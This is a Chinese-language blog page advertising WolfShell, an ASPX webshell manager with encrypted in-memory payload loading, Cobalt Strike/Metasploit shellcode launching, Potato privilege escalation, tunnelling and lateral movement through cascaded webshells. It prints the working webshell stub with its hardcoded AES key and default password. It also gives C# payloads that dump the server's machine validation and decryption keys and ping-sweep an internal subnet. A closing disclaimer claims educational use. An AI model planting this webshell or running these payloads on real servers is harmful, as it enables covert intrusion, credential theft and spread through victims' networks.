<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="renderer" content="webkit"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>18K软件 AI工具 免费资源</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/libs/highlight/styles/18k.css"><meta name="generator" content="Hexo 7.3.0"></head><body id="bodyx"><div class="hd posts"><a href="javascript:history.back()" class="replay-btn">返回</a><div class="post-title"><p>金刚狼：专为ASPX设计的高级WebShell管理工具</p><hr></div><div class="post-content"><p><img src="http://www.18k.icu/img/wolfshell/wolf.png" alt="WolfShell"></p><h1 id="金刚狼：专为ASPX设计的高级WebShell管理工具"><a href="#金刚狼：专为ASPX设计的高级WebShell管理工具" class="headerlink" title="金刚狼：专为ASPX设计的高级WebShell管理工具"></a>金刚狼：专为ASPX设计的高级WebShell管理工具</h1><p>金刚狼是一款专为 ASPX 环境设计的高级 WebShell 管理工具，为安全研究人员和渗透测试人员提供强大的命令执行、权限提升和内网穿透能力。</p><h2 id="🚀-核心优势"><a href="#🚀-核心优势" class="headerlink" title="🚀 核心优势"></a>🚀 核心优势</h2><ul><li>高效隐蔽的通信： 采用 二进制流 传输协议，确保通信的高效性与隐蔽性。</li><li>端到端安全加密： 所有传输 Payload 均经过 AES加密 保护，且每次通信使用 随机密钥，保障数据安全。</li><li>无痕运行： 支持直接在 内存中加载并执行代码，最大程度避免在磁盘留下痕迹，显著提升操作隐蔽性和安全性。</li><li>内网级联WebShell控制： 通过现有已控的WebShell，无需部署代理或配置端口转发，即可直接连接并控制处于更深层内网环境中的WebShell节点，实现便捷高效的内网横向穿透。</li></ul><h2 id="🔥-功能特性"><a href="#🔥-功能特性" class="headerlink" title="🔥 功能特性"></a>🔥 功能特性</h2><ul><li>Cmd命令执行： 在目标系统上直接执行任意 CMD 命令。</li><li>PowerShell命令执行： 支持执行 PowerShell 脚本和命令。</li><li>Shellcode执行： 可在目标环境内直接执行原生的 Shellcode，一键上线Cobalt Strike、Metasploit。</li><li>C#代码执行： 支持在运行时动态加载与执行 C# 代码。</li><li>端口转发： 实现本地端口到远程内网主机的映射，方便安全地访问内部网络服务。</li><li>HTTP代理： 一键内存注入Suo5高性能 HTTP 隧道代理工具。</li><li>Potato提权： 利用系统服务漏洞进行权限提升，支持两种提权模块：</li><li>efspotato： 利用 EFSPotato 实现权限提升。</li><li>badpotato： 利用 BadPotato 实现权限提升。</li><li>内网级联Cmd命令执行： 支持在复杂的内网环境中，级联内网webshell执行 CMD 命令进行横向移动。</li><li>内网级联PowerShell执行： 支持在复杂的内网环境中，级联内网webshell执行 PowerShell 命令进行横向移动。</li></ul><h2 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h2><ol><li><p><strong>下载WolfShell</strong></p><ul><li><a target="_blank" rel="noopener" href="https://github.com/0x7556/wolfshell/releases">https://github.com/0x7556/wolfshell/releases</a></li></ul></li><li><p><strong>配置环境</strong></p><ul><li>确保目标环境支持ASPX，并已正确配置。</li></ul></li><li><p><strong>上传WolfShell</strong></p><ul><li>将WolfShell文件上传到目标ASPX服务器。</li></ul></li></ol><figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp">&lt;%@ Page Language=<span class="hljs-string">&quot;C#&quot;</span> %&gt;&lt;%<span class="hljs-keyword">if</span> (Request.Cookies.Count != <span class="hljs-number">0</span>) &#123; <span class="hljs-built_in">byte</span>[] k = Encoding.Default.GetBytes(<span class="hljs-string">&quot;ca63457538b9b1e0&quot;</span>); System.IO.Stream s = Request.InputStream; <span class="hljs-built_in">byte</span>[] c = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[s.Length]; s.Read(c, <span class="hljs-number">0</span>, c.Length); System.Reflection.Assembly.Load(<span class="hljs-keyword">new</span> System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, <span class="hljs-number">0</span>, c.Length)).CreateInstance(<span class="hljs-string">&quot;K&quot;</span>).Equals(<span class="hljs-keyword">this</span>); &#125;%&gt;```<br><br><span class="hljs-number">4.</span> **访问WebShell**<br>   - 通过工具客户端连接WebShell，默认密码 WolfShell，修改密码可使用工具上的WolfHash加密。<br><br>![keep](http:<span class="hljs-comment">//www.18k.icu/img/wolfshell/WolfShell.png)</span><br><br><br><span class="hljs-meta">## 示例</span><br><br><span class="hljs-meta">### Cmd命令执行</span><br><br>![CmdShell示例](http:<span class="hljs-comment">//www.18k.icu/img/wolfshell/CmdShell.png)</span><br><br><span class="hljs-meta">### PowerShell命令执行</span><br><br>![PowerShell示例](http:<span class="hljs-comment">//www.18k.icu/img/wolfshell/PowerShell.png)</span><br><br><span class="hljs-meta">### C#代码执行</span><br><br><span class="hljs-meta">#### 获取 ValidationKey 示例代码</span><br><br>```csharp<br><br><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Reflection;<br><span class="hljs-keyword">using</span> System.Web.Configuration;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Eval</span><br>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">eval</span>(<span class="hljs-params">Object obj</span>)</span><br>&#123;<br><span class="hljs-keyword">var</span> sy = Assembly.Load(<span class="hljs-string">&quot;System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;</span>);<br><span class="hljs-keyword">var</span> mkt = sy.GetType(<span class="hljs-string">&quot;System.Web.Configuration.MachineKeySection&quot;</span>);<br><span class="hljs-keyword">var</span> gac = mkt.GetMethod(<span class="hljs-string">&quot;GetApplicationConfig&quot;</span>, BindingFlags.Static | BindingFlags.NonPublic);<br><span class="hljs-keyword">var</span> cg = (MachineKeySection)gac.Invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ValidationKey: &quot;</span> + cg.ValidationKey + <span class="hljs-string">&quot; | &quot;</span> + <span class="hljs-string">&quot;Validation: &quot;</span> + cg.Validation + <span class="hljs-string">&quot; | &quot;</span> + <span class="hljs-string">&quot;DecryptionKey: &quot;</span> + cg.DecryptionKey + <span class="hljs-string">&quot; | &quot;</span> + <span class="hljs-string">&quot;Decryption: &quot;</span> + cg.Decryption + <span class="hljs-string">&quot; | &quot;</span> + <span class="hljs-string">&quot;CompatibilityMode: &quot;</span> + cg.CompatibilityMode;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="http://www.18k.icu/img/wolfshell/CodeViewKey.png" alt="C#代码示例"></p><h4 id="扫描C段存活主机-示例代码"><a href="#扫描C段存活主机-示例代码" class="headerlink" title="扫描C段存活主机 示例代码"></a>扫描C段存活主机 示例代码</h4><figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp"><br><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Net;<br><span class="hljs-keyword">using</span> System.Net.NetworkInformation;<br><span class="hljs-keyword">using</span> System.Text;<br><span class="hljs-keyword">using</span> System.Threading.Tasks;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Eval</span><br>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">eval</span>(<span class="hljs-params">Object obj</span>)</span><br>&#123;<br>StringBuilder iplist = <span class="hljs-keyword">new</span> StringBuilder();<br><span class="hljs-built_in">string</span> baseIP = <span class="hljs-string">&quot;192.168.1.&quot;</span>;<br>PingOptions options = <span class="hljs-keyword">new</span> PingOptions();<br>options.DontFragment = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">var</span> tasks = <span class="hljs-keyword">new</span> Task[<span class="hljs-number">254</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">255</span>; i++)<br>&#123;<br><span class="hljs-built_in">int</span> ipSuffix = i;<br>tasks[i - <span class="hljs-number">1</span>] = Task.Run(() =&gt;<br>&#123;<br><span class="hljs-keyword">using</span> (Ping myPing = <span class="hljs-keyword">new</span> Ping())<br>&#123;<br>PingReply reply = myPing.Send(baseIP + ipSuffix, <span class="hljs-number">120</span>);<br><span class="hljs-keyword">if</span> (reply.Status == IPStatus.Success)<br>&#123;<br><span class="hljs-keyword">lock</span> (iplist)<br>&#123;<br>iplist.AppendLine(<span class="hljs-string">&quot;Alive IP: &quot;</span> + reply.Address.ToString());<br>&#125;<br>&#125;<br>&#125;<br>&#125;);<br>&#125;<br>Task.WaitAll(tasks);<br><span class="hljs-keyword">return</span> iplist.ToString();<br>&#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="http://www.18k.icu/img/wolfshell/CodeCping.png" alt="C#代码示例"></p><h3 id="Potato提权示例"><a href="#Potato提权示例" class="headerlink" title="Potato提权示例"></a>Potato提权示例</h3><h4 id="efspotato"><a href="#efspotato" class="headerlink" title="efspotato"></a>efspotato</h4><p><img src="http://www.18k.icu/img/wolfshell/EfsPotato.png" alt="EfsPotato示例"></p><h4 id="badpotato"><a href="#badpotato" class="headerlink" title="badpotato"></a>badpotato</h4><p><img src="http://www.18k.icu/img/wolfshell/BadPotato.png" alt="BadPotato示例"></p><h3 id="内网扫描示例"><a href="#内网扫描示例" class="headerlink" title="内网扫描示例"></a>内网扫描示例</h3><p><img src="http://www.18k.icu/img/wolfshell/NetScan.png" alt="NetScan示例"></p><h3 id="端口转发示例"><a href="#端口转发示例" class="headerlink" title="端口转发示例"></a>端口转发示例</h3><p><img src="http://www.18k.icu/img/wolfshell/PortTran.png" alt="端口转发示例"></p><h3 id="HTTP代理示例"><a href="#HTTP代理示例" class="headerlink" title="HTTP代理示例"></a>HTTP代理示例</h3><p><img src="http://www.18k.icu/img/wolfshell/Suo5Tunnel.png" alt="端口转发示例"></p><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><ul><li>使用WolfShell时，请遵循相关法律法规，确保在授权的环境中进行测试和使用。</li><li>本工具仅供教育和研究目的，任何滥用行为将由用户自行承担后果。</li></ul><h2 id="贡献"><a href="#贡献" class="headerlink" title="贡献"></a>贡献</h2><p>欢迎任何形式的贡献！请提交问题、建议或拉取请求。</p><h2 id="许可证"><a href="#许可证" class="headerlink" title="许可证"></a>许可证</h2><p>本项目采用MIT许可证，详细信息请参见<a href="LICENSE">LICENSE</a>文件。</p></div></div><div class="footer" id="footer"><p>Copyright © 2025 <a class="flink" target="_blank" rel="noopener" href="http://www.18k.icu">www.18k.icu</a> <label class="el-switch el-switch-green el-switch-sm" style="vertical-align:sub"><input type="checkbox" name="switch" id="update_style"> <span class="el-switch-style"></span></label></p></div><input type="hidden" id="web_style" value="black"> <input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz"> <input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf"><script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js"></script><script src="/libs/highlight/highlight.pack.js"></script><script src="/js/js.js"></script><style>.v *{color:#698fca}.v .vlist .vcard .vhead .vsys{color:#3a3e4a}.v .vlist .vcard .vh .vmeta .vat{color:#638fd5}.v .vlist .vcard .vhead .vnick{color:#6ba1ff}.v a{color:#8696b1}.v .vlist .vcard .vhead .vnick:hover{color:#669bfc}</style><script>var _hmt=_hmt||[];(()=>{var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?eb7eb8199824646269cd262b46a87950",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)})()</script></body></html>